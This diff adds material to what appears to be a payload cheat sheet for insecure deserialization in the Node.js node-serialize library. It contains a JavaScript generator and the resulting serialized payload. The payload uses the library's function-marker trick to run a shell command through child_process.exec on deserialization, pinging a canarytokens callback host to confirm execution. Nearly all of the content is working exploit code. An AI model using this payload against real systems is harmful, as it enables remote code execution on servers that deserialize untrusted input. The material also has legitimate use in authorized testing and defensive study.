@@ -1,8 +1,24 @@
 # Object Deserialization
 ## Node.JS - node-serialize
+Payload Generator:
+```sh
+let y = {
+  rce: function() {
+    require('child_process').exec('ping XXXXXXXXX.canarytokens.com', function(error, stdout, stderr) { console.log(stdout); });
+  },
+};
+
+let serialize = require('node-serialize');
+console.log("Serialized: \n" + serialize.serialize(y));
+```
+Run:
+```sh
+node serialize.js
+```
+
+Payload:
 ```sh
 {"rce":"_$$ND_FUNC$$_function() {require('child_process').exec('ping XXXXXXXXX.canarytokens.com', (error, stdout, stderr) => { console.log(stdout); }); } ()"}
-
 ```
 #####
 
